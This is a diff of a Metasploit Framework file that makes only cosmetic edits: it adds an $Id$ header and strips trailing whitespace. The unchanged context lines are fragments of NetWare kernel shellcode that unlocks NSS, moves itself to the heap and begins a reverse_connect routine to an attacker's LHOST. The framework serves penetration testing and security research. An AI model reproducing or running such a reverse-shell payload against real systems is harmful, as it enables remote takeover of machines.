@@ -1,5 +1,9 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -96,7 +100,7 @@ main_code:
         mov bp, word ptr [ebx+0x4E]
         shl ebp, 16
         mov bp, word ptr [ebx+0x48]
-        
+
 f_finddebugger:
         cmp dword ptr[ebp], 0
         jnz f_next
@@ -121,12 +125,12 @@ resolv_ptrs:
         dec cl
         test cl, cl
         jnz resolv_ptrs
-        
+
         sti
 
         // remove CIFS lock
         call [edi-4]          // NSS.NLM|NSSMPK_UnlockNss
-        
+
         // allocate heap buffer to remove the code from the stack (if on the stack)
         // network functions will give back control to the kernel and we don't want
         // the driver to erase our shellcode
@@ -157,7 +161,7 @@ reverse_connect:
         mov esi, eax
         test eax, eax
         jz end
-        
+
         push ebx
         push ebx
         push LHOST
